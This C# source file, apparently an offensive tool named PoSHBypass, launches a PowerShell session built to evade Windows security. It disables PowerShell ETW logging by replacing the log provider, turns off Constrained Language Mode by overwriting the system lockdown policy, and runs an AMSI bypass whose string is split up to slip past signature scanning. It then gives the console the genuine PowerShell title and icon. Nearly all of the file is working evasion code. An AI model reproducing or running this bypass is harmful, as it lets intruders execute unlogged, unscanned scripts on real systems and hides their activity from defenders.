using Microsoft.PowerShell;
using System;
using System.Drawing;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Security;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PoSHBypass
{
    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool SetConsoleTitle(string lpConsoleTitle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SendMessage(
          IntPtr hWnd,
          int Msg,
          int wParam,
          IntPtr lParam
        );

        const int WM_SETICON = 0x0080;
        const int ICON_BIG = 1;
        const int ICON_SMALL = 0;

        static void SetIcon()
        {
            try
            {
                IntPtr wnd = GetConsoleWindow();
                Icon icon = Icon.ExtractAssociatedIcon(
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
                        "WindowsPowerShell", "v1.0", "powershell.exe"));
                SendMessage(wnd, WM_SETICON, ICON_BIG, icon.Handle);
                SendMessage(wnd, WM_SETICON, ICON_SMALL, icon.Handle);
            }
            catch
            {
            }
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                //string Command = @"[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('No PS Logging Enabled and Constrained Language Mode Bypassed!!');";
                //string Command = @"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
                string Command = @"[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)";

                using (PowerShell powerShellInstance = PowerShell.Create())
                {
                    var psEtwLogProvider = powerShellInstance.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                    if (psEtwLogProvider != null)
                    {
                        var etwProvider = psEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                        var eventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                        etwProvider.SetValue(null, eventProvider);
                    }

                    var fi = typeof(SystemPolicy).GetField("systemLockdownPolicy", BindingFlags.NonPublic | BindingFlags.Static);
                    fi.SetValue(null, SystemEnforcementMode.None);

                    powerShellInstance.AddScript(Command);
                    powerShellInstance.Invoke();
                }

                AllocConsole();
                SetConsoleTitle("Windows PowerShell");
                SetIcon();
                var ps = new UnmanagedPSEntry();

                ps.Start(null, args);
                Environment.Exit(0);

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
